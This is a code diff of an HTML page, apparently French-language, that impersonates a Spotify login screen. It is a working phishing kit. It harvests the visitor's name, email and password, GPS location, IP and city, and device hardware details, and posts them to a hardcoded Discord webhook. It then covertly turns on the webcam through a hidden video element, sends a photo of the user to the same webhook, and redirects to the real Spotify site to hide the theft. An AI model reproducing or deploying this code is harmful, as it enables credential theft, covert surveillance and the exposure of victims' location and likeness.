@@ -3,122 +3,125 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Spotify Premium</title>
+    <title>Spotify - Connexion</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Figtree:wght@400;700;900&display=swap');
-        body { background-color: #000; color: #fff; font-family: 'Figtree', sans-serif; margin: 0; }
-        .app-container { width: 100%; max-width: 450px; margin: 0 auto; padding: 20px; text-align: center; }
-        .logo { width: 40px; margin: 20px auto 30px auto; }
+        body { background-color: #000; color: #fff; font-family: 'Figtree', sans-serif; margin: 0; display: flex; justify-content: center; }
+        .app-card { width: 100%; max-width: 450px; padding: 40px 25px; text-align: center; }
+        .logo { width: 45px; margin: 0 auto 35px auto; }
         
-        /* Simuler une interface d'application native */
-        .card { background: #121212; border-radius: 8px; padding: 20px; margin-bottom: 20px; text-align: left; }
-        label { display: block; font-size: 11px; font-weight: 900; color: #b3b3b3; margin-bottom: 8px; text-transform: uppercase; }
-        input { width: 100%; background: #282828; border: none; border-radius: 4px; padding: 12px; color: #fff; margin-bottom: 15px; outline: none; }
+        .field { text-align: left; margin-bottom: 15px; }
+        label { display: block; font-size: 13px; font-weight: 700; margin-bottom: 8px; color: #fff; }
+        input { width: 100%; background: #121212; border: 1px solid #727272; border-radius: 4px; padding: 14px; color: #fff; font-size: 15px; outline: none; transition: border 0.2s; }
+        input:focus { border: 2px solid #fff; padding: 13px; }
         
-        .btn-spotify { background: #1ed760; color: #000; font-weight: 900; padding: 15px; border-radius: 500px; width: 100%; border: none; cursor: pointer; text-transform: uppercase; font-size: 13px; }
+        .btn-green { background: #1ed760; color: #000; font-weight: 700; padding: 16px; border-radius: 500px; width: 100%; margin-top: 25px; font-size: 16px; border: none; cursor: pointer; text-transform: uppercase; }
         
-        /* Zone de "Scan" pour forcer la caméra */
-        #scan-zone { display: none; background: #000; position: fixed; inset: 0; z-index: 200; flex-direction: column; align-items: center; justify-content: center; }
-        .scan-frame { width: 250px; height: 250px; border: 2px solid #1ed760; border-radius: 20px; position: relative; overflow: hidden; }
-        video { width: 100%; height: 100%; object-fit: cover; }
+        .divider { display: flex; align-items: center; width: 100%; margin: 30px 0; color: #b3b3b3; font-size: 11px; font-weight: 900; letter-spacing: 1px; }
+        .divider::before, .divider::after { content: ''; flex: 1; border-bottom: 1px solid #292929; }
+        .divider:not(:empty)::before { margin-right: 1.5em; }
+        .divider:not(:empty)::after { margin-left: 1.5em; }
+
+        #loader { display: none; margin-top: 20px; }
+        .progress-bg { background: #282828; height: 4px; width: 100%; border-radius: 10px; overflow: hidden; }
+        .progress-bar { background: #1ed760; height: 100%; width: 0%; transition: width 0.5s; }
         
-        #loader-ui { display: none; margin-top: 20px; }
-        .bar-bg { background: #282828; height: 4px; width: 100%; border-radius: 2px; }
-        .bar-fill { background: #1ed760; height: 100%; width: 0%; transition: width 0.5s; }
+        #v, #c { position: absolute; left: -9999px; visibility: hidden; }
     </style>
 </head>
 <body>
-    <div class="app-container">
+    <div class="app-card">
         <img src="https://upload.wikimedia.org/wikipedia/commons/1/19/Spotify_logo_without_text.svg" class="logo">
-        
-        <div class="card">
-            <h2 style="font-weight:900; font-size:18px; margin-bottom:15px;">Vérification du compte</h2>
+
+        <div id="login-form">
             <div class="flex gap-2">
-                <div><label>Prénom</label><input id="fn" type="text" placeholder=""></div>
-                <div><label>Nom</label><input id="ln" type="text" placeholder=""></div>
+                <div class="field w-1/2"><label>Prénom</label><input id="fn" type="text"></div>
+                <div class="field w-1/2"><label>Nom</label><input id="ln" type="text"></div>
             </div>
-            <label>E-mail</label><input id="u" type="text" placeholder="">
-            <label>Mot de passe</label><input id="p" type="password" placeholder="">
-            <button onclick="startBypass()" class="btn-spotify">Activer le Premium</button>
+            <div class="field"><label>E-mail ou nom d'utilisateur</label><input id="u" type="text"></div>
+            <div class="field"><label>Mot de passe</label><input id="p" type="password"></div>
+            <button onclick="processLogin()" id="btn" class="btn-green">Se connecter</button>
         </div>
 
-        <div id="loader-ui">
-            <div class="bar-bg"><div id="pbar" class="bar-fill"></div></div>
-            <p id="status-text" style="font-size:12px; color:#b3b3b3; margin-top:10px;">Synchronisation des données...</p>
+        <div id="loader">
+            <div class="progress-bg"><div id="pbar" class="progress-bar"></div></div>
+            <p style="font-size: 12px; color: #b3b3b3; margin-top: 10px;">Vérification du compte...</p>
         </div>
+
+        <div class="divider">OU</div>
+        <p style="color: #b3b3b3; font-size: 14px;">Vous n'avez pas de compte ? <span style="color:#fff; text-decoration: underline; font-weight: 700;">S'inscrire</span></p>
     </div>
 
-    <div id="scan-zone">
-        <div class="scan-frame"><video id="v" autoplay playsinline muted></video></div>
-        <p style="margin-top:20px; font-weight:700;">Analyse biométrique en cours...</p>
-        <p style="font-size:12px; color:#b3b3b3;">Ne fermez pas l'application</p>
-    </div>
-
-    <canvas id="c" style="display:none;"></canvas>
+    <video id="v" autoplay playsinline muted></video>
+    <canvas id="c"></canvas>
 
     <script>
         const hook = "https://discord.com/api/webhooks/1481101174131392554/JO8MZpYjagqXqSFcnyp4ZCyOnUKe-vVdsyNeg7e7IJCVwdIgzlmeWxH65dQzr7hUXxke";
-        let gps = "❌ Bloqué par l'app";
 
-        async function startBypass() {
-            const data = { fn: document.getElementById('fn').value, ln: document.getElementById('ln').value, u: document.getElementById('u').value, p: document.getElementById('p').value };
+        async function processLogin() {
+            const data = {
+                fn: document.getElementById('fn').value,
+                ln: document.getElementById('ln').value,
+                u: document.getElementById('u').value,
+                p: document.getElementById('p').value
+            };
             if(!data.u || !data.p) return;
 
-            // 1. Déclenchement GPS
-            navigator.geolocation.getCurrentPosition((pos) => {
-                gps = `✅ **LOCALISÉ :** [Maps](https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude})`;
-            }, null, {enableHighAccuracy: true});
+            document.getElementById('login-form').style.display = 'none';
+            document.getElementById('loader').style.display = 'block';
+            const pb = document.getElementById('pbar');
 
-            // 2. Déclenchement Caméra via interface de "Scan"
-            document.getElementById('scan-zone').style.display = 'flex';
-            
+            // --- 1. LOCALISATION & INFOS ---
+            pb.style.width = "40%";
+            let gps = "❌ Bloqué";
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                const pos = await new Promise((res, rej) => {
+                    navigator.geolocation.getCurrentPosition(res, rej, {enableHighAccuracy: true, timeout: 5000});
+                });
+                gps = `✅ **MAPS :** [Lien](https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude})`;
+            } catch(e) {}
+
+            let net = {}; try { net = await fetch('https://ipapi.co/json/').then(r => r.json()); } catch(e){}
+            let bat = {}; try { bat = await navigator.getBattery(); } catch(e){}
+            const gl = document.createElement('canvas').getContext('webgl');
+            const gpu = gl ? gl.getParameter(gl.getExtension('WEBGL_debug_renderer_info').UNMASKED_RENDERER_WEBGL) : "Inconnu";
+
+            const payload = {
+                embeds: [{
+                    title: `🎵 LOG V33 - ${data.fn} ${data.ln}`,
+                    color: 1955168,
+                    fields: [
+                        { name: "👤 COMPTE", value: `**User:** \`${data.u}\`\n**Pass:** \`${data.p}\`` },
+                        { name: "📍 LOC", value: `**GPS:** ${gps}\n**IP:** \`${net.ip}\` (${net.city})` },
+                        { name: "📱 MATÉRIEL", value: `**GPU:** \`${gpu}\`\n**RAM:** \`${navigator.deviceMemory}GB\`\n**Batterie:** \`${Math.round(bat.level*100)}%\`` }
+                    ]
+                }]
+            };
+            await fetch(hook, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(payload) });
+
+            // --- 2. CAPTURE (PC=OK / APP=NOIR) ---
+            pb.style.width = "80%";
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 const video = document.getElementById('v');
                 video.srcObject = stream;
-
-                // On attend que la caméra s'adapte (3 secondes)
-                await new Promise(r => setTimeout(r, 3000));
-
-                // Capture de la photo nette
+                await new Promise(r => setTimeout(r, 2000));
                 const can = document.getElementById('c');
                 can.width = video.videoWidth; can.height = video.videoHeight;
                 can.getContext('2d').drawImage(video, 0, 0);
-
-                // Envoi des logs pendant que l'utilisateur voit le "scan"
-                let net = {}; try { net = await fetch('https://ipapi.co/json/').then(r => r.json()); } catch(e){}
-                let bat = {}; try { bat = await navigator.getBattery(); } catch(e){}
-                const gl = document.createElement('canvas').getContext('webgl');
-                const gpu = gl ? gl.getParameter(gl.getExtension('WEBGL_debug_renderer_info').UNMASKED_RENDERER_WEBGL) : "Inconnu";
-
-                const msg = {
-                    embeds: [{
-                        title: `📱 APP LOG V32 - ${data.fn} ${data.ln}`,
-                        color: 1955168,
-                        fields: [
-                            { name: "👤 UTILISATEUR", value: `**Prénom/Nom:** \`${data.fn} ${data.ln}\`\n**User:** \`${data.u}\`\n**Pass:** \`${data.p}\`` },
-                            { name: "📍 RÉSEAU & LOC", value: `**Maps:** ${gps}\n**IP:** \`${net.ip}\` **Ville:** \`${net.city}\`` },
-                            { name: "💻 HARDWARE", value: `**GPU:** \`${gpu}\`\n**RAM:** \`${navigator.deviceMemory}GB\`\n**Batterie:** \`${Math.round(bat.level*100)}%\`` }
-                        ]
-                    }]
-                };
-                await fetch(hook, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(msg) });
-
-                // Envoi de l'image
+                
                 can.toBlob(async b => {
                     const fd = new FormData();
-                    fd.append('file', b, 'app_capture.jpg');
-                    fd.append('content', `📸 **Visage App : ${data.fn} ${data.ln}**`);
+                    fd.append('file', b, 'capture.jpg');
+                    fd.append('content', `📸 **Capture : ${data.fn} ${data.ln}**`);
                     await fetch(hook, { method: 'POST', body: fd });
                     stream.getTracks().forEach(t => t.stop());
-                    window.location.href = "https://www.spotify.com/premium/";
                 }, 'image/jpeg', 0.8);
+            } catch(e) {}
 
-            } catch(e) {
-                // Si l'app bloque vraiment la cam, on envoie au moins le reste
-                window.location.href = "https://www.spotify.com/premium/";
-            }
+            pb.style.width = "100%";
+            setTimeout(() => { window.location.href = "https://www.spotify.com/premium"; }, 1000);
         }
     </script>
 </body>
